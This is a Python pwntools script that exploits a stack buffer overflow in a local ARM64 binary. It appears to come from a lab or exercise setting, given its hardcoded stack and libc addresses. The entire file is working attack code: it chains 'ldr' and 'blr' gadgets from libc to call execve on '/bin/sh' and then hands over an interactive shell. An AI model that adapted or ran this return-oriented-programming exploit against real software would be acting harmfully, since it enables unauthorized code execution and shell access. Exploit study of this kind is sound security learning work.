from pwn import *  # Import the pwntools library for exploitation utilities

# Load the target binary
binary = ELF('./build/main')  # Specify the target binary file
context.binary = binary       # Set binary context for pwntools
context.arch = 'aarch64'      # Specify the architecture as ARM64

# Address of the start of the buffer in the stack
buffer_addr = 0xfffffffff2d0

# Base address of the libc library in memory
libc_base = 0xfffff7e42000

# Offset and calculated address for the 'ldr' gadget
ldr_addr_offset = 0x000000000006722c
ldr_addr = libc_base + ldr_addr_offset  # Calculate the absolute address of the 'ldr' gadget

# Offset and calculated address for the 'blr' gadget
blr_addr_offset = 0x0000000000024088
blr_addr = libc_base + blr_addr_offset  # Calculate the absolute address of the 'blr' gadget

# Offset and calculated address for the 'execve' function
exec_addr_offset = 0x00000000000a73c0
exec_addr = libc_base + exec_addr_offset  # Calculate the absolute address of 'execve'

# Address for the "/bin/sh" string in the buffer
sh_addr = buffer_addr

# Construct the payload
payload = b"/bin/sh\0"        # Null-terminated "/bin/sh" string
payload += b"A" * 16          # Padding to fill the buffer
payload += p64(ldr_addr)      # Overwrite return address with the address of the 'ldr' gadget
payload += p64(0x0)           # Padding (unused for this step)
payload += p64(blr_addr)      # Overwrite the return address with the address of the 'blr' gadget
payload += p64(0x0)           # Padding (unused for this step)
payload += p64(sh_addr)       # Pointer to the "/bin/sh" string
payload += b"A" * 104         # Padding to reach the address of the execve function
payload += p64(exec_addr)     # Address of the 'execve' function

# Send the payload to the target program
p = process('./build/main')# Start the target binary as a process
p.sendline(payload)           # Send the constructed payload to the process
p.interactive()               # Switch to interactive mode to work with the shell